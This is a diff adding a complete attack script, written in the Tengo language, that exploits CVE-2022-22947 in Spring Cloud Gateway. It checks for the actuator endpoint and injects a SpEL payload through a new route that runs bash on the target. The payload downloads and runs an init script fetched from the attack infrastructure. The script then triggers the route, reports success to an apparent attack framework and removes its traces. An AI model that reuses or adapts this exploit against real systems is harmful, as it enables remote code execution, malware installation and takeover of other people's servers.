@@ -1,0 +1,200 @@
+/*
+* This spring_cloud_gateway_rce_cve_2022_22947.tengo is an attack script that attacks target host by spring Cloud Gateway 参数注入漏洞
+* CVE-2022-22947
+*
+*global variable:
+*attackTarget
+*attackScript
+*/
+
+fmt  := import("fmt")
+http := import("http")
+text := import("text")
+attack := import("attack")
+rand := import("rand")
+
+AttackName := "SpringCloudGatewayAttackCVE2022_22947"
+AttackType := "SpringCloudGatewayAttackCVE2022_22947"
+AttackInitScriptName := "init.sh"
+
+UA := "GoClient"
+timeoutMS := 10000
+
+host := attackTarget.ip
+port := attackTarget.port
+proto := attackTarget.proto
+
+isSSL := (proto == "https" ||port==443)
+client := http.newHttpClient(host,port,isSSL,timeoutMS)
+
+
+
+//make attack process and publish into attack tasks and send into sbot
+sendAttackResult := func(rid) {
+
+    attackProcess := attack.newAttackProcess()
+    attackProcess.setIP(host)
+    attackProcess.setHost(host)
+    attackProcess.setPort(port)
+    attackProcess.setProto(isSSL?"https":"http")
+    attackProcess.setApp("SpringCloudGateway")
+    attackProcess.setName(AttackName)
+    attackProcess.setType(AttackType)
+    attackProcess.setStatus(0)
+    attackProcess.setPayload(rid)
+    attackProcess.setResult(rid)
+    attackProcess.setDetails(rid)
+
+    //publish attack process into attack tasks
+    attackScript.pubProcess(attackProcess)
+}
+
+//get route id
+mkRouteId := func(){
+
+    rnd := rand.intn(10000)
+    return fmt.sprintf("cbot_%d",rnd)
+}
+
+//make attack payload
+mkPayload := func(rid) {
+
+    initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,AttackType)
+
+    pfmt := `{
+               "id": "%s",
+               "filters": [{
+                 "name": "AddResponseHeader",
+                 "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"bash,-c,%s;id\".split(\",\")).getInputStream()))}"}
+               }],
+             "uri": "http://cbot.com",
+             "order": 0
+             }`
+
+    return fmt.sprintf(pfmt,rid,initDownloadCmd)
+}
+
+hasPath := func() {
+
+    url := "/actuator/gateway/routes/"
+    request := http.newHttpRequest("get",url).addHeader("User-Agent",UA)
+    request.addHeader("Content-Type","application/x-www-form-urlencoded")
+
+    response := client.send(request)
+
+
+    if response.getStatusCode() !=200 {
+        return false
+    }
+
+    content := response.getBodyAsString()
+
+    if content == "" {
+        return false
+    }
+
+    if !text.contains(content,"{") ||!text.contains(content,"predicate") {
+
+            return false
+    }
+
+    return true
+
+}
+
+//添加路由
+addRoute := func(rid) {
+
+    url := "/actuator/gateway/routes/"+rid
+    payload := mkPayload(rid)
+
+    request := http.newHttpRequest("post",url).addHeader("User-Agent",UA)
+    request.addHeader("Content-Type","application/json")
+
+    request.putString(payload,false)
+    response := client.send(request)
+
+
+    if response.getStatusCode() !=201 {
+        return false
+    }
+
+    return true
+}
+
+//刷新路由
+reFreshRoute := func(){
+
+    url := "/actuator/gateway/refresh"
+
+    request := http.newHttpRequest("post",url).addHeader("User-Agent",UA)
+    request.addHeader("Content-Type","application/x-www-form-urlencoded")
+
+    response := client.send(request)
+
+
+    if response.getStatusCode() !=200 {
+        return false
+    }
+
+    return true
+}
+
+//触发漏洞
+trigAttack := func(rid){
+
+    url := "/actuator/gateway/routes/"+rid
+    request := http.newHttpRequest("get",url).addHeader("User-Agent",UA)
+    request.addHeader("Content-Type","application/x-www-form-urlencoded")
+
+    response := client.send(request)
+
+
+    if response.getStatusCode() !=200 {
+        return false
+    }
+
+    content := response.getBodyAsString()
+
+    if content == "" {
+        return false
+    }
+
+    if !text.contains(content,"{") ||!text.contains(content,rid) {
+
+            return false
+    }
+
+    return true
+
+}
+
+//删除路由
+deleteRoute := func(rid){
+
+    url := "/actuator/gateway/routes/"+rid
+    request := http.newHttpRequest("delete",url).addHeader("User-Agent",UA)
+    request.addHeader("Content-Type","application/x-www-form-urlencoded")
+
+    response := client.send(request)
+
+}
+
+main := func(){
+
+    if hasPath(){
+
+        rid := mkRouteId()
+        addRoute(rid)
+        reFreshRoute()
+        if trigAttack(rid) {
+            sendAttackResult(rid)
+        }
+
+        deleteRoute(rid)
+    }
+
+}
+
+main()
